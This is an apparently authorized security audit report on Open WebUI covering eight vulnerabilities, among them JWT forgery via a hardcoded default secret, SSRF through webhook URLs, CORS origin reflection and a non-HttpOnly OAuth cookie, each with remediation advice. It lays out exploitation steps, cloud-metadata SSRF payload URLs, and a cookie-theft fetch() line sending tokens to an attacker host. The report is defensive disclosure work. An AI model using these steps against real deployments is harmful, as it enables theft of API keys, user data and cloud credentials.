# Open WebUI Security Audit Report

**Date:** 2026-04-22  
**Auditor:** AutoFyn Security  
**Product:** Open WebUI (ghcr.io/open-webui/open-webui)  
**Commit tested:** main branch (post-f162d4de)  
**Severity scale:** Critical / High / Medium / Low / Informational

---

## Executive Summary

Open WebUI ships with a hardcoded JWT signing secret (`t0p-s3cr3t`) that is used
as the default when the `WEBUI_SECRET_KEY` environment variable is not set. Because
no first-run secret generation occurs, any deployment that does not explicitly set
this variable is immediately vulnerable to **full administrative compromise with no
prior credentials**.

An unauthenticated attacker can:

1. Sign up a free user account (the signup endpoint is public by default).
2. Forge a valid admin-level JWT using the known default secret.
3. Use that JWT to exfiltrate all OpenAI API keys, enumerate all users, and
   download the entire SQLite database.
4. Hijack the system webhook to exfiltrate all future signup/signin events to an
   attacker-controlled server, including internal AWS/GCP/Azure metadata services.

The attack chain requires zero admin negligence and exploits only the default
configuration.

This audit round also identified **three additional findings** (Findings 6–8) that
affect **all default deployments, including Docker** (unlike Finding 1):

- **Finding 6** — CORS wildcard origin reflection with credentials enables any
  website holding a stolen token to make authenticated cross-origin API calls and
  read the responses.
- **Finding 7** — Token revocation is a no-op without Redis (the default); stolen
  tokens persist for their full JWT lifetime even after the victim logs out.
- **Finding 8** — OAuth JWT cookies are set with `httponly=False`, allowing any
  XSS on the domain to steal the token via `document.cookie`.

## Deployment-Specific Impact

**Docker deployments (ghcr.io/open-webui/open-webui):** The official Docker image
includes a `start.sh` script that generates a random secret key when
`WEBUI_SECRET_KEY` is empty or unset. This means default Docker deployments are
**not vulnerable** to Finding 1 (JWT forgery via known default secret), because the
secret is randomized at container startup.

**pip-install deployments:** When Open WebUI is installed via pip and run directly
(e.g., `open-webui serve`), there is no `start.sh` wrapper. The hardcoded default
`t0p-s3cr3t` from `env.py:566` is used as-is. These deployments **are vulnerable**
to the full attack chain described in this report.

**Explicit WEBUI_SECRET_KEY=t0p-s3cr3t:** Any deployment (Docker or pip) where the
operator explicitly sets `WEBUI_SECRET_KEY` to the well-known default value is also
vulnerable. Our PoC testing was performed against a Docker container with
`-e WEBUI_SECRET_KEY=t0p-s3cr3t` to simulate this scenario.

**Findings 6, 7, and 8 — universal impact:** Unlike Finding 1, Findings 6–8 do
**not** require knowledge of the JWT secret and are **not** mitigated by Docker's
`start.sh` key generation. They affect all default deployments — Docker, pip-install,
and any cloud-hosted instance — because they stem from CORS configuration defaults,
missing Redis infrastructure for token revocation, and an explicit `httponly=False`
in the OAuth callback code path.

**Test evidence:** All exploit outputs are saved in `autofyn_audit/evidence/`.

---

## Scope

| In Scope | Out of Scope |
|---|---|
| Default-config vulnerabilities | Admin-configured misconfigurations |
| JWT forgery via default secret | Tools/Functions exec() (intended) |
| Admin data exfiltration (consequence of #1) | Social engineering |
| SSRF via webhook (post-exploitation) | Physical access |
| User enumeration by verified users | |
| Admin details exposed to pending users | |
| CORS wildcard origin reflection (Finding 6) | |
| Token revocation no-op without Redis (Finding 7) | |
| OAuth JWT cookie without HttpOnly (Finding 8) | |

---

## Methodology

- Static source code review of the Python FastAPI backend
- Dynamic PoC testing against a Docker container with explicit
  `WEBUI_SECRET_KEY=t0p-s3cr3t` (simulating pip-install default behavior)
- All PoC scripts use only standard HTTP requests and PyJWT — no framework
  exploitation, no memory corruption
- Dynamic PoC testing confirmed against Docker container with explicit
  `WEBUI_SECRET_KEY=t0p-s3cr3t` (simulating pip-install default behavior)
- All four exploits (JWT forgery, admin data theft, SSRF webhook, full chain)
  executed successfully against Open WebUI v0.9.1

---

## Findings

---

### Finding 1: JWT Forgery via Hardcoded Default Secret (CRITICAL)

**CVSS 3.1:** 9.8 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**Description:**

Open WebUI uses `t0p-s3cr3t` as the default JWT signing secret when the
`WEBUI_SECRET_KEY` environment variable is absent. The secret is set at module
import time and never regenerated. Any attacker who knows this public default can
forge a JWT for any user ID in the database.

**Note:** The official Docker image mitigates this by generating a random key in
`start.sh` when `WEBUI_SECRET_KEY` is empty. However, pip-install deployments and
any deployment with `WEBUI_SECRET_KEY` left at the default are fully vulnerable.

**Affected Code:**

```
backend/open_webui/env.py lines 564-567
    WEBUI_SECRET_KEY = os.environ.get(
        'WEBUI_SECRET_KEY',
        os.environ.get('WEBUI_JWT_SECRET_KEY', 't0p-s3cr3t'),
    )

backend/open_webui/utils/auth.py line 50
    SESSION_SECRET = WEBUI_SECRET_KEY

backend/open_webui/utils/auth.py lines 200-211
    def create_token(data: dict, expires_delta=None) -> str:
        ...
        encoded_jwt = jwt.encode(payload, SESSION_SECRET, algorithm=ALGORITHM)
```

**Constraint:** The forged JWT's `id` claim must match a real user ID in the
database (`auth.py:356 Users.get_user_by_id(data['id'])`). An attacker
satisfies this by signing up a free account first, which also discloses the
admin email via `GET /api/v1/auths/admin/details`.

**Exploitation Steps:**

```
1.  GET  /api/version                           # confirm target is Open WebUI
2.  POST /api/v1/auths/signup                   # create attacker account
3.  GET  /api/v1/auths/admin/details            # leak admin email (any authed user)
4.  GET  /api/v1/users/search?query=<email>     # find admin user ID (any verified user)
5.  Forge JWT: jwt.encode({'id': admin_id, 'jti': uuid4(), 'iat': now},
                           't0p-s3cr3t', algorithm='HS256')
6.  GET  /openai/config   Authorization: Bearer <forged>  # confirms admin access
```

**PoC:** `autofyn_audit/exploit_jwt_forgery.py`

**Impact:**

Complete administrative control over the Open WebUI instance. All subsequent
findings are direct consequences of this one.

**Remediation:**

Generate a cryptographically random secret on first startup if `WEBUI_SECRET_KEY`
is not set, and persist it to disk (e.g., `data/.secret_key`). Refuse to start if
the secret cannot be persisted (prevents silent reuse of the default across
restarts).

```python
# Suggested first-run generation:
import secrets, pathlib
key_file = pathlib.Path(DATA_DIR) / '.secret_key'
if not key_file.exists():
    key_file.write_text(secrets.token_hex(32))
WEBUI_SECRET_KEY = os.environ.get('WEBUI_SECRET_KEY') or key_file.read_text().strip()
```

---

### Finding 2: Admin API Key Exposure (HIGH)

**CVSS 3.1:** 7.5 — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N` (standalone: PR:H)  
*(Chained with Finding 1: effective PR:N — no auth needed to reach admin access)*

**Description:**

`GET /openai/config` returns the complete list of OpenAI API keys in cleartext.
No masking or partial redaction is applied. Combined with Finding 1, an attacker
obtains all configured API keys within seconds.

**Affected Code:**

```
backend/open_webui/routers/openai.py lines 236-243
    @router.get('/config')
    async def get_config(request: Request, user=Depends(get_admin_user)):
        return {
            ...
            'OPENAI_API_KEYS': request.app.state.config.OPENAI_API_KEYS,
            ...
        }
```

**PoC:** `autofyn_audit/exploit_admin_data_theft.py`

**Impact:**

Full exposure of all configured OpenAI API keys, enabling attacker to incur
charges, access OpenAI usage data, or use keys for secondary attacks.

**Remediation:**

Mask API keys in GET responses (return only last 4 characters). Use a separate
endpoint or admin confirmation flow to reveal full keys. Consider encrypting keys
at rest using a key derived from `WEBUI_SECRET_KEY`.

---

### Finding 3: Database Export Enables Full Data Theft (HIGH)

**CVSS 3.1:** 7.5 — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N` (standalone: PR:H)  
*(Chained with Finding 1: effective PR:N — no auth needed to reach admin access)*

**Description:**

`GET /api/v1/utils/db/download` streams the entire SQLite database file to the
caller. `ENABLE_ADMIN_EXPORT` defaults to `True`. The database contains all
users (with hashed passwords), chat histories, API keys, model configurations,
and all other application data.

**Affected Code:**

```
backend/open_webui/routers/utils.py lines 105-123
    @router.get('/db/download')
    async def download_db(user=Depends(get_admin_user)):
        if not ENABLE_ADMIN_EXPORT:
            raise HTTPException(...)
        return FileResponse(engine.url.database, ...)

backend/open_webui/config.py line 1689
    ENABLE_ADMIN_EXPORT = PersistentConfig('ENABLE_ADMIN_EXPORT', ..., True)
```

**PoC:** `autofyn_audit/exploit_admin_data_theft.py`

**Impact:**

Complete exfiltration of all application data. Bcrypt hashes can be subjected to
offline cracking. Chat histories and private information are fully exposed.

**Remediation:**

Default `ENABLE_ADMIN_EXPORT` to `False`. Add a secondary confirmation step
(e.g., password re-entry) before allowing database export. Rate-limit or audit-log
all export requests.

---

### Finding 4: SSRF via Unvalidated Webhook URLs (MEDIUM-HIGH)

**CVSS 3.1:** 8.1 — `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:L/A:N`  
*(Scope Change: attacker pivots to internal network/cloud metadata)*

**Description:**

The system webhook URL (set via `POST /api/webhook`) and per-user webhook URLs
accept arbitrary values with zero validation. The webhook is triggered on every
signup and signin event, causing the server to make an outbound HTTP POST to the
configured URL. An attacker with admin access (obtained via Finding 1) can point
this at cloud metadata endpoints, internal services, or attacker infrastructure.

**Affected Code:**

```
backend/open_webui/main.py lines 2337-2352
    class UrlForm(BaseModel):
        url: str     # <-- no validator, accepts any string

    @app.post('/api/webhook')
    async def update_webhook_url(form_data: UrlForm, user=Depends(get_admin_user)):
        app.state.config.WEBHOOK_URL = form_data.url
        ...

backend/open_webui/utils/webhook.py lines 53-56
    async with aiohttp.ClientSession(...) as session:
        async with session.post(url, json=payload, ssl=...) as r:
            ...                # <-- no URL validation before request

backend/open_webui/routers/auths.py lines 703-713
    if request.app.state.config.WEBHOOK_URL:
        await post_webhook(..., request.app.state.config.WEBHOOK_URL, ...)
```

**Exploitation Steps (post-Finding 1):**

```
POST /api/webhook   Authorization: Bearer <forged-admin-jwt>
Body: {"url": "http://169.254.169.254/latest/meta-data/"}

# Now trigger the webhook by signing up any new user:
POST /api/v1/auths/signup  {"name": "trigger", "email": "t@t.local", ...}
# -> Server POSTs to 169.254.169.254, returning AWS instance metadata
```

**Dangerous Payload URLs:**

| Target | URL |
|---|---|
| AWS Instance Metadata | `http://169.254.169.254/latest/meta-data/` |
| AWS IMDSv2 Token | `http://169.254.169.254/latest/api/token` |
| GCP Metadata | `http://metadata.google.internal/computeMetadata/v1/` |
| Azure IMDS | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| Redis | `http://localhost:6379/` |
| Ollama | `http://localhost:11434/api/tags` |
| Self-reference | `http://host.docker.internal:8080/api/v1/users/` |

**PoC:** `autofyn_audit/exploit_ssrf_webhook.py`

**Impact:**

Server-side request forgery enabling access to cloud instance metadata (leading to
IAM credential theft on AWS/GCP/Azure), internal service enumeration, and exfiltration
of sensitive user data (email, id, role) on every authentication event.

**Remediation:**

1. Validate webhook URLs against an allowlist of approved hostnames, or reject
   private IP ranges (RFC 1918, link-local 169.254.x.x, loopback).
2. Add a Pydantic validator to `UrlForm` that checks the resolved IP is not private.
3. Consider using a DNS rebinding-resistant HTTP client that re-checks the resolved
   address before connecting.

```python
from pydantic import AnyHttpUrl, validator
import ipaddress, socket

class UrlForm(BaseModel):
    url: AnyHttpUrl

    @validator('url')
    def reject_private_ips(cls, v):
        host = str(v).split('/')[2].split(':')[0]
        try:
            ip = ipaddress.ip_address(socket.gethostbyname(host))
            if ip.is_private or ip.is_link_local or ip.is_loopback:
                raise ValueError('Private/internal URLs are not allowed')
        except socket.gaierror:
            raise ValueError('Cannot resolve webhook URL hostname')
        return v
```

---

### Finding 5: User Enumeration via Search Endpoint (MEDIUM)

**CVSS 3.1:** 5.3 — `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`

**Description:**

`GET /api/v1/users/search` is accessible to any verified (non-pending) user. It
returns full user objects including `id`, `email`, `name`, and `role` for all users
matching the query. With an empty query it pages through all users. This allows any
registered user to enumerate the entire user base.

Additionally, `GET /api/v1/auths/admin/details` is accessible to **any
authenticated user** (including pending users), disclosing the admin's name and
email address.

**Affected Code:**

```
backend/open_webui/routers/users.py line 115-137
    @router.get('/search', response_model=UserInfoListResponse)
    async def search_users(
        ...
        user=Depends(get_verified_user),   # <-- any non-pending user
        ...
    ):

backend/open_webui/routers/auths.py lines 922-947
    @router.get('/admin/details')
    async def get_admin_details(
        request: Request,
        user=Depends(get_current_user),   # <-- any authenticated user, including pending
        ...
    ):
```

**PoC:** Used as a step in `exploit_jwt_forgery.py` and `exploit_chain.py`.

**Impact:**

Enables targeted phishing, credential stuffing preparation, and is a prerequisite
step for Finding 1 (admin ID discovery). The admin email disclosure applies to
pending users who have not yet been approved.

**Remediation:**

1. Restrict `/users/search` to admin role only, or filter returned fields (omit
   `email`, `id` for non-admin callers).
2. Restrict `/api/v1/auths/admin/details` to verified users at minimum; consider
   requiring admin role for the `email` field.

---

### Finding 6: CORS Wildcard Origin Reflection with Credentials (HIGH)

**CVSS 3.1:** 8.1 — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`

**Description:**

`CORS_ALLOW_ORIGIN` defaults to `'*'` (`config.py:1756`). When `'*'` is used,
Starlette's `CORSMiddleware` is configured with `allow_credentials=True`
(`main.py:1390-1396`). Per the Starlette implementation, when `allow_all_origins=True`
and `allow_credentials=True`, the middleware reflects the request `Origin` header
value back as `Access-Control-Allow-Origin` (rather than sending the literal `*`),
paired with `Access-Control-Allow-Credentials: true`.

Once a token is obtained by any means, any website can use it to make authenticated
cross-origin API calls and read the responses — because the browser sees a matching
`Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials: true` and
permits the cross-origin read.

**Note on SameSite=lax:** The default `SameSite=lax` cookie setting prevents
cross-origin `fetch()` with `credentials: 'include'` from automatically sending the
`token` cookie. This finding is therefore about token *reuse* from a foreign origin
(once a token is obtained by any other means, e.g., via Finding 8), not direct cookie
theft via CORS alone.

**Affected Code:**

```
backend/open_webui/config.py line 1756
    CORS_ALLOW_ORIGIN = os.environ.get('CORS_ALLOW_ORIGIN', '*').split(';')

backend/open_webui/main.py lines 1390-1396
    app.add_middleware(
        CORSMiddleware,
        allow_origins=CORS_ALLOW_ORIGIN,   # ['*'] by default
        allow_credentials=True,            # hardcoded True
        allow_methods=['*'],
        allow_headers=['*'],               # includes 'authorization'
    )
```

**Exploitation Steps:**

```
1. Obtain a valid token by any means (e.g., XSS + Finding 8 for OAuth users,
   or directly if attacker has an account)
2. From attacker page on https://evil.example.com, call:
     fetch('https://target.com/api/v1/auths/', {
       headers: { 'Authorization': 'Bearer <token>' }
     }).then(r => r.json()).then(data => exfiltrate(data))
3. Verify response includes:
     Access-Control-Allow-Origin: https://evil.example.com
     Access-Control-Allow-Credentials: true
4. Browser allows the cross-origin read — attacker reads authenticated response
```

**PoC:** `autofyn_audit/exploit_cors_origin_reflection.py`

**Impact:**

Any website holding a stolen token can make authenticated cross-origin API calls and
read the full response body, including sensitive user data, chat history, and (with
admin token) API keys and user lists. The CORS reflection amplifies every other
token-theft vector in this audit.

**Remediation:**

1. Set `CORS_ALLOW_ORIGIN` to the specific production hostname(s) — never `'*'`.
2. If wildcard must be used, set `allow_credentials=False`.
3. Add a startup warning that fails loudly (not just logs) when both
   `allow_origins=['*']` and `allow_credentials=True` are configured together.

---

### Finding 7: Token Revocation No-Op Without Redis (HIGH)

**CVSS 3.1:** 7.5 — `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`

**Description:**

`invalidate_token()` at `auth.py:254` and `is_valid_token()` at `auth.py:229` both
guard all revocation logic behind `if request.app.state.redis:`. When Redis is not
configured (the default for all Docker and pip-install deployments), these functions
return immediately without performing any revocation.

`GET /api/v1/auths/signout` calls `invalidate_token()`, but the call is a no-op.
The token remains valid for its full JWT lifetime after signout. `JWT_EXPIRES_IN`
defaults to 4 weeks (`4w`) but can be set to no-expiry.

This means a stolen token cannot be revoked by the victim logging out.

**Affected Code:**

```
backend/open_webui/utils/auth.py lines 229-251 (is_valid_token)
    if request.app.state.redis:
        # per-token revocation check via Redis
        ...
    return True       # <-- always True when redis is falsy

backend/open_webui/utils/auth.py lines 254-276 (invalidate_token)
    if request.app.state.redis:
        # store revoked jti in Redis
        ...
    # <-- silent no-op when redis is falsy

backend/open_webui/routers/auths.py lines 780-781
    if token:
        await invalidate_token(request, token)  # no-op without Redis
```

**Exploitation Steps:**

```
1. Obtain victim's token (e.g., via network interception or Finding 8)
2. Victim calls GET /api/v1/auths/signout — server returns 200 (appears to succeed)
3. Attacker sends: GET /api/v1/auths/
                   Authorization: Bearer <stolen-token>
   -> 200 OK — token is still valid
4. Attacker retains access until token's JWT exp claim is reached
```

**PoC:** `autofyn_audit/exploit_token_revocation_bypass.py`

**Impact:**

Stolen tokens cannot be invalidated by victim action. Combined with Finding 6 (CORS
origin reflection), an attacker using a stolen token from a foreign origin continues
to have access even after the victim logs out. If the victim is an admin, the attacker
retains admin-level access for up to 4 weeks (or the configured token lifetime).

**Remediation:**

1. Deploy Redis and configure it via `REDIS_URL`. This activates the existing
   per-token revocation logic that is already in the codebase.
2. If Redis cannot be deployed, implement a short-lived server-side revocation list
   (e.g., in-memory set or database table) as a fallback — do not silently skip
   revocation.
3. Reduce default `JWT_EXPIRES_IN` to a shorter window (e.g., 1 hour) to bound
   the window of exposure when revocation is not available.

---

### Finding 8: OAuth JWT Cookie Without HttpOnly (HIGH)

**CVSS 3.1:** 6.1 — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` (standalone)  
*(Chained with XSS + Findings 6 & 7: effective severity HIGH)*

**Note: This is a code-review finding.** OAuth requires an external Identity Provider;
the PoC demonstrates the vulnerability via static code analysis and comparison with
the password-login code path. Dynamic confirmation of the OAuth cookie flag requires
a configured OAuth provider.

**Description:**

The OAuth callback handler at `oauth.py:1720-1727` sets the JWT cookie with
`httponly=False`. The comment says "Required for frontend access", but the password
login handler at `auths.py:127-134` uses `httponly=True` for the same cookie — this
is a direct inconsistency in the same codebase.

`httponly=False` means the `token` cookie is accessible via `document.cookie` in
JavaScript. Any XSS vulnerability on the Open WebUI domain (stored XSS in chat names,
model descriptions, etc.) can steal the JWT of OAuth-authenticated users. Password-
authenticated users are NOT affected by this specific finding.

**Affected Code:**

```
backend/open_webui/utils/oauth.py lines 1720-1727  [VULNERABLE — httponly=False]
    response.set_cookie(
        key='token',
        value=jwt_token,
        httponly=False,  # Required for frontend access
        samesite=WEBUI_AUTH_COOKIE_SAME_SITE,
        secure=WEBUI_AUTH_COOKIE_SECURE,
        ...
    )

backend/open_webui/routers/auths.py lines 127-134  [SAFE — httponly=True]
    response.set_cookie(
        key='token',
        value=token,
        httponly=True,
        samesite=WEBUI_AUTH_COOKIE_SAME_SITE,
        secure=WEBUI_AUTH_COOKIE_SECURE,
        ...
    )
```

**Exploitation Steps:**

```
1. Attacker identifies or injects an XSS payload on the Open WebUI domain
   (e.g., stored XSS in a chat title rendered in another user's session)
2. Victim with OAuth session visits the XSS page; payload executes:
     fetch('https://attacker.com/steal?t=' + document.cookie)
3. Attacker receives 'token=<jwt>' in the exfiltrated data
4. Attacker uses token from https://evil.example.com with Authorization header
   (Finding 6: CORS reflection allows cross-origin reads)
5. Victim logs out — token remains valid (Finding 7: revocation no-op)
```

**PoC:** `autofyn_audit/exploit_oauth_cookie_httponly.py`

**Impact:**

OAuth-authenticated users' JWT tokens are readable by any XSS payload on the domain.
The stolen token feeds directly into the CORS attack chain (Finding 6) and persists
after victim logout (Finding 7). This finding enables the full three-finding attack
chain described in the Cross-Origin Attack Chain section below.

**Remediation:**

1. Change `httponly=False` to `httponly=True` in `oauth.py:1723`.
2. If the frontend requires JavaScript access to the token (e.g., to read it from
   `document.cookie`), consider using a separate non-HttpOnly session indicator and
   keeping the actual JWT HttpOnly.
3. Audit all other `set_cookie()` calls for similar inconsistencies.

---

## Attack Chain

```
[Attacker]
    |
    | 1. GET /api/version                     (no auth required)
    |    -> confirm target is Open WebUI
    |
    | 2. POST /api/v1/auths/signup            (no auth required)
    |    -> attacker gets valid user token + user ID
    |
    | 3. GET /api/v1/auths/admin/details      (any authenticated user)
    |    -> admin email disclosed
    |
    | 4. GET /api/v1/users/search             (any verified user)
    |    -> admin user ID disclosed
    |
    | 5. Forge JWT: jwt.encode({'id': admin_id}, 't0p-s3cr3t', 'HS256')
    |    -> attacker holds forged admin token
    |
    | 6. GET  /openai/config                  (admin only — bypassed)
    |    -> ALL OpenAI API keys stolen
    |
    | 7. GET  /api/v1/users/                  (admin only — bypassed)
    |    -> ALL users enumerated (email, hash, role, last_active)
    |
    | 8. GET  /api/v1/utils/db/download       (admin only — bypassed)
    |    -> FULL SQLite database downloaded
    |
    | 9. POST /api/webhook                    (admin only — bypassed)
    |    body: {"url": "http://169.254.169.254/..."}
    |    -> every future signup/signin POSTs user data to attacker URL
    |       (also enables cloud metadata access from server)
    |
    v
[Complete Compromise]
```

---

## Cross-Origin Attack Chain (Findings 6 + 7 + 8)

```
[Attacker]
    |
    | 1. SETUP: Inject XSS payload into Open WebUI domain
    |    (e.g., stored XSS in a chat name, model description)
    |
    | 2. VICTIM: OAuth user visits the XSS page
    |    document.cookie is readable because token cookie has httponly=False
    |    (Finding 8: oauth.py:1723 httponly=False)
    |    -> JavaScript exfiltrates 'token=<jwt>' to attacker
    |
    | 3. ATTACKER now holds victim's JWT token
    |    From https://evil.example.com, sends:
    |      GET /api/v1/chats/    Authorization: Bearer <stolen-token>
    |                            Origin: https://evil.example.com
    |    Server responds:
    |      Access-Control-Allow-Origin: https://evil.example.com
    |      Access-Control-Allow-Credentials: true
    |    (Finding 6: CORS origin reflection — browser allows cross-origin read)
    |    -> Attacker reads full response: all victim's chat history
    |
    | 4. VICTIM realizes compromise, logs out
    |    GET /api/v1/auths/signout  Authorization: Bearer <victim-token>
    |    -> Server: 200 OK (but invalidate_token() is a no-op without Redis)
    |    (Finding 7: auth.py:254 skips revocation when redis is falsy)
    |
    | 5. ATTACKER retries with same token after victim's logout
    |    GET /api/v1/auths/    Authorization: Bearer <stolen-token>
    |                          Origin: https://evil.example.com
    |    -> 200 OK — token still valid
    |    -> CORS headers still reflected
    |    -> Attacker retains access until JWT exp (up to 4 weeks by default)
    |
    | 6. IF VICTIM IS ADMIN: Attacker accesses admin endpoints:
    |    GET /api/v1/users/    -> all users enumerated
    |    GET /openai/config    -> all API keys stolen
    |
    v
[Persistent Cross-Origin Compromise]
  Duration: up to 4 weeks after victim's logout (default JWT_EXPIRES_IN=4w)
  Scope   : any OAuth-authenticated user on a deployment with XSS surface
  Affected: ALL default deployments (Docker + pip-install)
```

**PoC:** `autofyn_audit/exploit_cors_chain.py`

---

## Impact Assessment

| Dimension | Impact | Detail |
|---|---|---|
| Confidentiality | **Complete** | All API keys, user data, chat history, database |
| Integrity | **High** | Attacker can modify configs, add users, change webhook |
| Availability | **Medium** | SSRF can target internal services; DoS via config changes |

---

## Remediation Recommendations

Priority order:

1. **[CRITICAL] Generate random `WEBUI_SECRET_KEY` on first startup.** Persist to
   `data/.secret_key`. Never fall back to a hardcoded string. This single change
   eliminates Findings 1, 2, and 3 in their current form.

2. **[HIGH] Validate webhook URLs.** Reject private IP ranges, link-local addresses,
   and loopback in both `UrlForm` (Pydantic validator) and `post_webhook()`. Use an
   allowlist of approved URL patterns if feasible.

3. **[HIGH] Mask API keys in GET responses.** Return only the last 4 characters.
   Provide a separate, audit-logged endpoint for key rotation.

4. **[MEDIUM] Default `ENABLE_ADMIN_EXPORT` to `False`.** Require explicit opt-in.
   Add a secondary confirmation step (re-authentication) before streaming the database.

5. **[MEDIUM] Restrict `/users/search` to admin role.** Or filter `email`/`id` from
   non-admin responses. Restrict `/admin/details` to verified users (not pending).

6. **[LOW] Add rate limiting to signup.** Prevent automated account creation used to
   bootstrap the attack chain.

7. **[HIGH] Restrict `CORS_ALLOW_ORIGIN` to specific production hostnames.** Remove
   the `'*'` default or, at minimum, do not combine `allow_origins=['*']` with
   `allow_credentials=True`. Affects ALL deployments (Finding 6).

8. **[HIGH] Deploy Redis and configure `REDIS_URL`.** This activates the existing
   per-token revocation logic. Without Redis, token revocation is silently skipped
   and stolen tokens cannot be invalidated. As a short-term mitigation, reduce
   `JWT_EXPIRES_IN` to limit the exposure window (Finding 7).

9. **[HIGH] Set `httponly=True` on the OAuth JWT cookie.** Change `oauth.py:1723`
   from `httponly=False` to `httponly=True` to match the password-login code path
   and prevent JavaScript-readable token cookies (Finding 8).

---

## PoC Scripts Reference

| Script | Demonstrates |
|---|---|
| `test_environment.py` | Docker test environment setup |
| `exploit_jwt_forgery.py` | Finding 1: JWT forgery |
| `exploit_admin_data_theft.py` | Findings 2 & 3: API key + DB exfiltration |
| `exploit_ssrf_webhook.py` | Finding 4: SSRF via webhook |
| `exploit_chain.py` | Full end-to-end attack chain (Findings 1–4) |
| `exploit_cors_origin_reflection.py` | Finding 6: CORS origin reflection |
| `exploit_token_revocation_bypass.py` | Finding 7: Token revocation no-op |
| `exploit_oauth_cookie_httponly.py` | Finding 8: OAuth cookie httponly=False |
| `exploit_cors_chain.py` | Cross-origin chain (Findings 6+7+8 combined) |
| `setup.sh` | Convenience wrapper for test environment setup |
| `teardown.sh` | Remove the test Docker container |

All scripts accept `--target <url>` and produce structured output with `[+]`, `[-]`,
`[*]`, `[!]` prefixes. Run `python3 <script> --help` for options.

---

## Confirmed Test Results

All exploits were executed against Open WebUI v0.9.1 running in Docker with
`WEBUI_SECRET_KEY=t0p-s3cr3t`. Evidence output files are in `autofyn_audit/evidence/`.

| Exploit | Status | Key Result |
|---|---|---|
| JWT Forgery (`exploit_jwt_forgery.py`) | **CONFIRMED** | Forged admin JWT accepted; GET /openai/config returned 200 |
| Admin Data Theft (`exploit_admin_data_theft.py`) | **CONFIRMED** | 1 API key stolen, 3 users enumerated, 548 KB database downloaded |
| SSRF Webhook (`exploit_ssrf_webhook.py`) | **CONFIRMED** | AWS metadata URL accepted as webhook with no validation |
| Full Attack Chain (`exploit_chain.py`) | **CONFIRMED** | All 4 phases completed: signup -> JWT forgery -> data theft -> SSRF |

### Attack Chain Output Summary

```
Phase 1 — Initial Access      : Signed up regular user account
Phase 2 — Privilege Escalation : Forged admin JWT (secret: 't0p-s3cr3t')
Phase 3 — Data Exfiltration    :
  OpenAI API keys stolen : 1
  Users enumerated       : 5
  Database downloaded    : True (548 KB)
Phase 4 — Persistent Access    : SSRF webhook set to AWS metadata endpoint
```

---

*This report was produced for authorized security testing purposes only.*
*Unauthorized use of these techniques against systems you do not own is illegal.*
